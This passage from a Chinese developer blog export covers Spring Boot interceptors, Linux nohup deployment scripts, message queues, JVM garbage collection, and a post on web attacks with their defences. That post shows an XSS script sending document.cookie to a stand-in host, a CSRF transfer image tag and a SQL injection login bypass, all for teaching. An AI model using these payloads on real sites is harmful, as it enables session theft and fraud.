&#125;&#125; TimeInterceptor实现了HandlerInterceptor接口的三个方法。preHandle方法在处理拦截之前执行，postHandle只有当被拦截的方法没有抛出异常成功时才会处理，afterCompletion方法无论被拦截的方法抛出异常与否都会执行。 通过这三个方法的参数可以看到，相较于过滤器，拦截器多了Object和Exception对象，所以可以获取的信息比过滤器要多的多。但过滤器仍无法获取到方法的参数等信息，我们可以通过切面编程来实现这个目的。 要使拦截器在Spring Boot中生效，还需要如下两步配置： 1.在拦截器类上加入@Component注解； 2.在WebConfig中通过InterceptorRegistry注册过滤器: 12345678910@Configurationpublic class WebConfig extends WebMvcConfigurerAdapter &#123; @Autowired private TimeInterceptor timeInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(timeInterceptor); &#125;&#125; 启动项目，访问http://localhost:8080/user/1，控制台输出如下： 123456789处理拦截之前cc.mrbird.controller.UserControllerget1开始处理拦截【拦截器】耗时 24处理拦截之后【拦截器】耗时 24异常信息 null 从输出中我们可以了解到三个方法的执行顺序，并且三个方法都被执行了。 我们在UserController的get方法中手动抛出一个异常： 12345 @GetMapping(&quot;/&#123;id:\\d+&#125;&quot;)public void get(@PathVariable String id) &#123; System.out.println(id); throw new RuntimeException(&quot;user not exist&quot;);&#125; 重启项目后，访问http://localhost:8080/user/1，控制台输出如下： 1234567处理拦截之前cc.mrbird.controller.UserControllerget1处理拦截之后【拦截器】耗时 0异常信息 java.lang.RuntimeException: user not exist 可看到，postHandle方法并没有被执行。 执行时机对比我们将过滤器和拦截器都配置上，然后启动项目访问http://localhost:8080/user/1： 123456789101112开始执行过滤器处理拦截之前cc.mrbird.controller.UserControllerget1开始处理拦截【拦截器】耗时 25处理拦截之后【拦截器】耗时 25异常信息 null【过滤器】耗时 34结束执行过滤器 可看到过滤器要先于拦截器执行，晚于拦截器结束。下图很好的描述了它们的执行时间区别：]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>拦截器</tag>
        <tag>过滤器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下部署Springboot应用]]></title>
    <url>%2F2019%2F01%2F15%2FLinux%E4%B8%8B%E9%83%A8%E7%BD%B2Springboot%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[部署Spring Boot项目可以使用Maven命令mvn:clean package将项目打包成只执行的jar文件，然后使用命令java -jar XX.jar来执行。但这样做无法将shell命令行释放，关闭terminal后项目也随之关闭了。这里介绍在Linux系统中后台运行Spring Boot jar文件的方法。 实现这个功能主要依赖于Linux的nohup命令。nohup命令可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。 nohup语法： 123nohup 命令用途：不挂断地运行命令。语法：nohup Command [ Arg … ][ &amp; ] 所以只需要在启动命令前加上nohup命令，末尾加上&amp;即可：nohup java -jar XX.jar &amp;。 为了方便，我们可以编写启动脚本start.sh： 1nohup java -jar XX.jar &amp; 关停脚本stop.sh： 12345678PID=`ps -ef | grep sms-2.0.jar | grep -v grep | awk '&#123;print $2&#125;'`if [ -z "$PID" ]then echo Application is already stoppedelse echo kill $PID kill -9 $PIDfi 重启脚本run.sh： 1234echo stop applicationsource stop.shecho start applicationsource start.sh 在编写shell脚本的过程中遇到了两个问题： 执行.sh文件提示权限不足： 解决办法：执行命令chmod u+x XX.sh赋予当前用于可执行的权限即可。 提示/bin/bash^M: bad interpreter: 没有那个文件或目录。 问题出现的原因是shell脚本是在windows中编写的然后上传到Linux中的，出现了兼容性问题。解决办法：执行vim XX.sh打开shell文件，然后切换到命令模式，执行:set fileformat=unix后保存退出即可。 使用了nohup命令后，会在jar文件目录下生成一个nohup.out文件，可通过其观察当前项目的运行情况： 1234567891011121314151617181920$ ll总用量 76612drwxrwxr-x 2 zjrun zjrun 4096 2月 8 08:49 log-rw------- 1 zjrun zjrun 58695723 2月 8 10:15 nohup.out-rwxrw-r-- 1 zjrun zjrun 88 2月 7 15:17 run.sh-rw-rw-r-- 1 zjrun zjrun 19730199 2月 8 10:11 sms-1.0.jar-rwxrw-r-- 1 zjrun zjrun 60 2月 7 15:22 start.sh-rwxrw-r-- 1 zjrun zjrun 184 2月 7 15:19 stop.sh$ tail -10f nohup.out 10:14:31.309 logback [main] INFO o.s.j.e.a.AnnotationMBeanExporter - Registering beans for JMX exposure on startup10:14:31.478 logback [main] INFO o.a.coyote.http11.Http11NioProtocol - Initializing ProtocolHandler [&quot;http-nio-8963&quot;]10:14:31.498 logback [main] INFO o.a.coyote.http11.Http11NioProtocol - Starting ProtocolHandler [&quot;http-nio-8963&quot;]10:14:31.506 logback [main] INFO o.a.tomcat.util.net.NioSelectorPool - Using a shared selector for servlet write/read10:14:31.634 logback [main] INFO o.s.b.c.e.t.TomcatEmbeddedServletContainer - Tomcat started on port(s): 8963 (http)10:14:31.644 logback [main] INFO com.xingyi.sms.SmsApplication - Started SmsApplication in 7.213 seconds (JVM running for 8.03)complete!10:15:26.978 logback [http-nio-8963-exec-1] INFO o.a.c.c.C.[.[localhost].[/mobilePre] - Initializing Spring FrameworkServlet &apos;dispatcherServlet&apos;10:15:26.979 logback [http-nio-8963-exec-1] INFO o.s.web.servlet.DispatcherServlet - FrameworkServlet &apos;dispatcherServlet&apos;: initialization started10:15:27.004 logback [http-nio-8963-exec-1] INFO o.s.web.servlet.DispatcherServlet - FrameworkServlet &apos;dispatcherServlet&apos;: initialization completed in 25 ms]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>maven</tag>
        <tag>jar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻击技术]]></title>
    <url>%2F2019%2F01%2F15%2F%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[一、跨站脚本攻击概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。 攻击原理例如有一个论坛网站，攻击者可以在上面发布以下内容： 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式： 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。 危害 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段1. 设置 Cookie 为 HttpOnly设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。 2. 过滤特殊字符例如将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。 富文本编辑器允许用户输入 HTML 代码，就不能简单地将 &lt; 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。 富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。 以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。 12345678910111213&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;123&lt;/p&gt;&lt;form&gt; &lt;input type="text" name="q" value="test"&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt; 12345678910111213&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;123&lt;/p&gt;&amp;lt;form&amp;gt; &amp;lt;input type="text" name="q" value="test"&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&amp;lt;script type="text/javascript"&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt; XSS 过滤在线测试 二、跨站请求伪造概念跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。 攻击原理假如一家银行用以执行转账操作的 URL 地址如下： 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。 那么，一个恶意攻击者可以在另一个网站上放置如下代码： 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。 防范手段1. 检查 Referer 首部字段Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。 2. 添加校验 Token在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。 3. 输入验证码因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。 三、SQL 注入攻击概念服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。 攻击原理例如一个网站登录验证的 SQL 查询代码为： 1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');" 如果填入以下内容： 12userName = "1' OR '1'='1";passWord = "1' OR '1'='1"; 那么 SQL 查询字符串为： 1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');" 此时无需验证通过就能执行以下查询： 1strSQL = "SELECT * FROM users;" 防范手段1. 使用参数化查询Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。 1234PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery(); 2. 单引号转换将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。 四、拒绝服务攻击拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>攻击技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[消息队列]]></title>
    <url>%2F2019%2F01%2F15%2F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[一、消息模型点对点消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。 发布/订阅消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。 发布与订阅模式和观察者模式有以下不同： 观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，发布者与订阅者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，发布者向频道发送一个消息之后，就不需要关心订阅者何时去订阅这个消息，可以立即返回。 二、使用场景异步处理发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。 例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。 只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。 流量削锋在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。 可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。 应用解耦如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。 通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。 三、可靠性发送端的可靠性发送端完成操作后一定能将消息成功发送到消息队列中。 实现方法： 在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。 接收端的可靠性接收端能够从消息队列成功消费一次消息。 两种实现方法： 保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
      <tags>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java虚拟机]]></title>
    <url>%2F2019%2F01%2F11%2Fjava%E8%99%9A%E6%8B%9F%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[一、运行时数据区域 程序计数器记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。 Java 虚拟机栈每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。 可以通过 -Xss 这个虚拟机参数来指定每个线程的 Java 虚拟机栈内存大小： 1java -Xss512M HackTheJava 该区域可能抛出以下异常： 当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常； 栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。 本地方法栈本地方法栈与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。 本地方法一般是用其它语言（C、C++ 或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序，对待这些方法需要特别处理。 堆所有对象都在这里分配内存，是垃圾收集的主要区域（”GC 堆”）。 现代的垃圾收集器基本都是采用分代收集算法，其主要的思想是针对不同类型的对象采取不同的垃圾回收算法。可以将堆分成两块： 新生代（Young Generation） 老年代（Old Generation） 堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。 可以通过 -Xms 和 -Xmx 这两个虚拟机参数来指定一个程序的堆内存大小，第一个参数设置初始值，第二个参数设置最大值。 1java -Xms1M -Xmx2M HackTheJava 方法区用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 和堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。 对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。 HotSpot 虚拟机把它当成永久代来进行垃圾回收。但很难确定永久代的大小，因为它受到很多因素影响，并且每次 Full GC 之后永久代的大小都会改变，所以经常会抛出 OutOfMemoryError 异常。为了更容易管理方法区，从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。 方法区是一个 JVM 规范，永久代与元空间都是其一种实现方式。在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间中。元空间存储类的元信息，静态变量和常量池等放入堆中。 运行时常量池运行时常量池是方法区的一部分。 Class 文件中的常量池（编译器生成的字面量和符号引用）会在类加载后被放入这个区域。 除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。 直接内存在 JDK 1.4 中新引入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在堆内存和堆外内存来回拷贝数据。 二、垃圾收集垃圾收集主要是针对堆和方法区进行。程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后就会消失，因此不需要对这三个区域进行垃圾回收。 判断一个对象是否可被回收1. 引用计数算法为对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。 在两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。正是因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。 1234567891011121314public class Test &#123; public Object instance = null; public static void main(String[] args) &#123; Test a = new Test(); Test b = new Test(); a.instance = b; b.instance = a; a = null; b = null; doSomething(); &#125;&#125; 在上述代码中，a 与 b 引用的对象实例互相持有了对象的引用，因此当我们把对 a 对象与 b 对象的引用去除之后，由于两个对象还存在互相之间的引用，导致两个 Test 对象无法被回收。 2. 可达性分析算法以 GC Roots 为起始点进行搜索，可达的对象都是存活的，不可达的对象可被回收。 Java 虚拟机使用该算法来判断对象是否可被回收，GC Roots 一般包含以下内容： 虚拟机栈中局部变量表中引用的对象 本地方法栈中 JNI 中引用的对象 方法区中类静态属性引用的对象 方法区中的常量引用的对象 3. 方法区的回收因为方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高。 主要是对常量池的回收和对类的卸载。 为了避免内存溢出，在大量使用反射和动态代理的场景都需要虚拟机具备类卸载功能。 类的卸载条件很多，需要满足以下三个条件，并且满足了条件也不一定会被卸载： 该类所有的实例都已经被回收，此时堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。 4. finalize()类似 C++ 的析构函数，用于关闭外部资源。但是 try-finally 等方式可以做得更好，并且该方法运行代价很高，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。 当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会再调用该方法。 引用类型无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。 Java 提供了四种强度不同的引用类型。 1. 强引用被强引用关联的对象不会被回收。 使用 new 一个新对象的方式来创建强引用。 1Object obj = new Object(); 2. 软引用被软引用关联的对象只有在内存不够的情况下才会被回收。 使用 SoftReference 类来创建软引用。 123Object obj = new Object();SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);obj = null; // 使对象只被软引用关联 3. 弱引用被弱引用关联的对象一定会被回收，也就是说它只能存活到下一次垃圾回收发生之前。 使用 WeakReference 类来创建弱引用。 123Object obj = new Object();WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);obj = null; 4. 虚引用又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到一个对象。 为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。 使用 PhantomReference 来创建虚引用。 123Object obj = new Object();PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj, null);obj = null; 垃圾收集算法1. 标记 - 清除 在标记阶段，程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。 在清除阶段，会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。 在分配时，程序会搜索空闲链表寻找空间大于等于新对象大小 size 的块 block。如果它找到的块等于 size，会直接返回这个分块；如果找到的块大于 size，会将块分割成大小为 size 与 (block - size) 的两部分，返回大小为 size 的分块，并把大小为 (block - size) 的块返回给空闲链表。 不足： 标记和清除过程效率都不高； 会产生大量不连续的内存碎片，导致无法给大对象分配内存。 2. 标记 - 整理 让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 优点: 不会产生内存碎片 不足: 需要移动大量对象，处理效率比较低。 3. 复制 将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。 主要不足是只使用了内存的一半。 现在的商业虚拟机都采用这种收集算法回收新生代，但是并不是划分为大小相等的两块，而是一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象全部复制到另一块 Survivor 上，最后清理 Eden 和使用过的那一块 Survivor。 HotSpot 虚拟机的 Eden 和 Survivor 大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 就不够用了，此时需要依赖于老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。 4. 分代收集现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。 一般将堆分为新生代和老年代。 新生代使用：复制算法 老年代使用：标记 - 清除 或者 标记 - 整理 算法 垃圾收集器 以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。 单线程与多线程：单线程指的是垃圾收集器只使用一个线程，而多线程使用多个线程； 串行与并行：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并行指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。 1. Serial 收集器 Serial 翻译为串行，也就是说它以串行的方式执行。 它是单线程的收集器，只会使用一个线程进行垃圾收集工作。 它的优点是简单高效，在单个 CPU 环境下，由于没有线程交互的开销，因此拥有最高的单线程收集效率。 它是 Client 场景下的默认新生代收集器，因为在该场景下内存一般来说不会很大。它收集一两百兆垃圾的停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿时间是可以接受的。 2. ParNew 收集器 它是 Serial 收集器的多线程版本。 它是 Server 场景下默认的新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合使用。 3. Parallel Scavenge 收集器与 ParNew 一样是多线程收集器。 其它收集器目标是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，因此它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户程序的时间占总时间的比值。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，适合在后台运算而不需要太多交互的任务。 缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。 可以通过一个开关参数打开 GC 自适应的调节策略（GC Ergonomics），就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例、晋升老年代对象年龄等细节参数了。虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量。 4. Serial Old 收集器 是 Serial 收集器的老年代版本，也是给 Client 场景下的虚拟机使用。如果用在 Server 场景下，它有两大用途： 在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。 作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 5. Parallel Old 收集器 是 Parallel Scavenge 收集器的老年代版本。 在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 6. CMS 收集器 CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。 分为以下四个流程： 初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。 并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。 并发清除：不需要停顿。 在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。 具有以下缺点： 吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。 无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。 标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。 7. G1 收集器G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。 堆被分为新生代和老年代，其它收集器进行收集的范围都是整个新生代或者老年代，而 G1 可以直接对新生代和老年代一起回收。 G1 把堆划分成多个大小相等的独立区域（Region），新生代和老年代不再物理隔离。 通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。 每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。 如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤： 初始标记 并发标记 最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。 筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。 具备如下特点： 空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。 可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。 三、内存分配与回收策略Minor GC 和 Full GC Minor GC：回收新生代，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。 Full GC：回收老年代和新生代，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。 内存分配策略1. 对象优先在 Eden 分配大多数情况下，对象在新生代 Eden 上分配，当 Eden 空间不够时，发起 Minor GC。 2. 大对象直接进入老年代大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。 经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。 -XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 和 Survivor 之间的大量内存复制。 3. 长期存活的对象进入老年代为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。 -XX:MaxTenuringThreshold 用来定义年龄的阈值。 4. 动态对象年龄判定虚拟机并不是永远要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。 5. 空间分配担保在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的。 如果不成立的话虚拟机会查看 HandlePromotionFailure 的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC；如果小于，或者 HandlePromotionFailure 的值不允许冒险，那么就要进行一次 Full GC。 Full GC 的触发条件对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件： 1. 调用 System.gc()只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。 2. 老年代空间不足老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。 为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。 3. 空间分配担保失败使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第 5 小节。 4. JDK 1.7 及以前的永久代空间不足在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据。 